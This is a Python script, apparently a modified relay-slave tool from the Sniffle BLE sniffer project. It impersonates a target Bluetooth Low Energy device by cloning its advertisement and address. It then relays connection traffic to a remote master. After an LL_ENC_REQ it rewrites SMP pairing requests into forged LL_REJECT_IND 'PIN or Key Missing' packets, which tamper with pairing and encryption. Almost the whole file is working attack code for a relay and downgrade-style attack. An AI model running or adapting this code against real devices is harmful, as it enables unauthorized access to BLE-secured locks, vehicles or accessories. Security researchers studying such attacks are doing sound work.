#!/usr/bin/env python3

# Written by Sultan Qasim Khan
# Copyright (c) 2020-2025, NCC Group plc
# Copyright (c) 2025, Tetrel Security Inc.
# Released as open source under GPLv3

import argparse, sys, signal
from time import time
from select import select
from struct import pack, unpack

from sniffle.sniffle_hw import (SniffleHW, BLE_ADV_AA, PacketMessage, DebugMessage, StateMessage,
                                MeasurementMessage, SnifferMode)
from sniffle.packet_decoder import DPacketMessage, ConnectIndMessage, LlDataContMessage
from sniffle.relay_protocol import connect_relay, MessageType
from sniffle.packet_decoder import DPacketMessage, DataMessage, LlDataContMessage, \
        AdvIndMessage, AdvDirectIndMessage, ScanRspMessage, ConnectIndMessage, \
        str_mac, LlControlMessage, AdvertMessage

# global variable to access hardware
hw = None
_aa = 0

bonding = True
seen_pairing_req = False

def sigint_handler(sig, frame):
    hw.cancel_recv()
    hw.cmd_chan_aa_phy() # stop advertising or connection
    hw.cmd_rssi(0)
    sys.exit(0)

def main():
    aparse = argparse.ArgumentParser(description="Relay slave script for Sniffle BLE5 sniffer")
    aparse.add_argument("-s", "--serport", default=None, help="Sniffer serial port name")
    aparse.add_argument("-M", "--masteraddr", default="127.0.0.1", help="IP address of relay master")
    aparse.add_argument("-q", "--quiet", action="store_const", default=False, const=True,
            help="Don't show empty packets")
    args = aparse.parse_args()

    global hw
    hw = SniffleHW(args.serport)

    # put the hardware in a normal state (passive scanning) and configure it with an impossibly
    # high RSSI threshold so that it captures nothing (to avoid filling receive buffers)
    hw.setup_sniffer(mode=SnifferMode.PASSIVE_SCAN, rssi_min=0, pause_done=True)

    conn = connect_relay(args.masteraddr)
    print("Connected to master.")
    

    # Network latency test
    mtype, body = conn.recv_msg()
    if mtype != MessageType.PING or body != b'latency_test':
        raise ValueError("Unexpected message type in latency test")
    conn.send_msg(MessageType.PING, b'latency_test')

    # fetch, decode, and apply preloaded conn params from master (if any)
    mtype, body = conn.recv_msg()
    if mtype != MessageType.PRELOAD:
        raise ValueError("Expected preloads")
    plstr = str(body, encoding='utf-8')
    preloads = []
    if len(plstr):
        # expect colon separated pairs, separated by commas
        preloads = []
        for tstr in plstr.split(','):
            tsplit = tstr.split(':')
            tup = (int(tsplit[0]), int(tsplit[1]))
            preloads.append(tup)
    hw.cmd_interval_preload(preloads)
    hw.cmd_phy_preload()

    # obtain the target's advertisement and scan response from the master
    print("Waiting for advertisement and scan response...")
    mtype, advert_body = conn.recv_msg()
    if mtype != MessageType.ADVERT:
        raise ValueError("Got wrong message type %s" % mtype.name)
    mtype, scan_rsp_body = conn.recv_msg()
    if mtype != MessageType.SCAN_RSP:
        raise ValueError("Got wrong message type %s" % mtype.name)
    print("Received advertisement and scan response.")

    # parse the advert and scan response for later use
    advert = DPacketMessage.from_body(advert_body)
    scan_rsp = DPacketMessage.from_body(scan_rsp_body)

    # wait for master to unpause us
    mtype, _ = conn.recv_msg()
    if mtype != MessageType.PING:
        raise ValueError("Got wrong message type %s" % mtype.name)

    # advertise to impersonate our target
    hw.cmd_setaddr(advert.AdvA, bool(advert.TxAdd))
    hw.cmd_adv_interval(200) # approx 200ms advertising interval
    adv_data = advert.body[8:]
    scan_rsp_data = scan_rsp.body[8:]
    hw.cmd_follow(True) # accept connections
    hw.cmd_rssi(-128)
    hw.mark_and_flush()
    hw.cmd_advertise(adv_data, scan_rsp_data)

    # trap Ctrl-C
    signal.signal(signal.SIGINT, sigint_handler)

    # wait for someone to connect to us
    conn_pkt = None
    while conn_pkt is None:
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue

        dpkt = DPacketMessage.decode(msg)
        print(dpkt, end='\n\n')

        if isinstance(dpkt, ConnectIndMessage):
            hw.decoder_state.cur_aa = dpkt.aa_conn
            conn_pkt = dpkt

    # notify relay master of the connection
    conn.send_msg(MessageType.CONN_REQ, conn_pkt.body)

    # main receive loop
    while True:
        ready, _, _ = select([hw.ser.fd, conn.sock], [], [])

        if conn.sock in ready:
            sock_recv_print_forward(conn)
        if hw.ser.fd in ready:
            ser_recv_print_forward(conn, args.quiet)

def sock_recv_print_forward(conn):
    mtype, body = conn.recv_msg()
    if mtype != MessageType.PACKET:
        return
    event, = unpack('<H', body[:2])
    body = body[2:]
    llid = body[0] & 3
    pdu = body[2:]
    hw.cmd_transmit(llid, pdu, event)
    pkt = DPacketMessage.from_body(body, True, True)
    pkt.ts_epoch = time()
    pkt.ts = pkt.ts_epoch - hw.decoder_state.first_epoch_time
    pkt.event = event
    print(pkt, end='\n\n')

def ser_recv_print_forward(conn, quiet):
    global bonding 
    global seen_pairing_req

    msg = hw.recv_and_decode()
    print_message(msg, quiet)

    # only forward packets
    if not isinstance(msg, PacketMessage):
        return

    msg = DPacketMessage.decode(msg)
    empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0

    if isinstance(msg, LlControlMessage) and msg.opcode == 0x03 and bonding:
        print("LL_ENC_REQ seen, this means that next pairing request should be modified \n")
        seen_pairing_req = True
        LLENCREQ_event = msg.event
        # Replace LL_ENC_RSP with LL_REJECT_IND if bonding is set
    if not empty and isinstance(msg, PacketMessage):
        if is_smp_pairing_req(msg.body) and seen_pairing_req: 
            print("[MODIFY] Replacing Pairing request with LL_REJECT_IND (PIN or Key Missing)")

            # Change opcode field in message object
            msg.opcode = 0x0D  # LL_REJECT_IND
            msg.payload = bytes([0x06])  # Error code: PIN or Key Missing

            # Modify body while preserving NESN/SN/MD flags
            old_hdr = msg.body[0] if len(msg.body) > 0 else 0x00
            llid_masked = (old_hdr & 0b11111100) | 0b11  # LLID = 0b11 (LL Control PDU)

            new_len = 2  # Payload: opcode + error code
            new_opcode = 0x0D
            error_code = 0x06

            msg.body = bytes([llid_masked, new_len, new_opcode, error_code])
            print(f"  Final msg.body = {msg.body.hex()}")

    # don't forward empty packets
    is_empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
    if not is_empty:
        # forward received packets to relay master
        conn.send_msg(MessageType.PACKET, pack('<H', msg.event) + msg.body)

def print_message(msg, quiet=False):
    if isinstance(msg, PacketMessage):
        print_packet(msg, quiet)
    elif isinstance(msg, DebugMessage) or \
            isinstance(msg, StateMessage) or \
            isinstance(msg, MeasurementMessage):
        print(msg, end='\n\n')

def print_packet(pkt, quiet=False):
    # Further decode and print the packet
    dpkt = DPacketMessage.decode(pkt)
    if quiet and isinstance(dpkt, LlDataContMessage) and dpkt.data_length == 0:
        return
    print(dpkt, end='\n\n')


# Assuming these exist somewhere in your code:
# _SMP_CID = 0x0006
# _SMP_PAIRING_REQ = 0x01

def is_smp_pairing_req(ll_body: bytes) -> bool:
    print(ll_body)
    _SMP_CID = 0x0006
    _SMP_PAIRING_REQ = 0x01
    _SMP_PAIRING_RSP = 0x02
    _MIC_LEN = 4  
    # Need at least LL header + minimal L2CAP header
    if len(ll_body) < 4:
        return False

    # LL data PDU: bits 0-1 are LLID
    llid = ll_body[0] & 0x03
    length = ll_body[1]

    # Must be LL Data PDU with full payload present
    if llid != 0x02 or len(ll_body) < 2 + length or length < 4:
        return False

    # L2CAP header at offset 2
    l2cap = ll_body[2:2+length]
    l2len = l2cap[0] | (l2cap[1] << 8)
    cid   = l2cap[2] | (l2cap[3] << 8)

    # Must be SMP CID and have enough bytes for a pairing message
    if cid != _SMP_CID or l2len < 7 or len(l2cap) < 4 + l2len:
        return False

    # SMP PDU: first byte is the SMP code
    smp_code = l2cap[4]
    return smp_code == _SMP_PAIRING_REQ


if __name__ == "__main__":
    main()
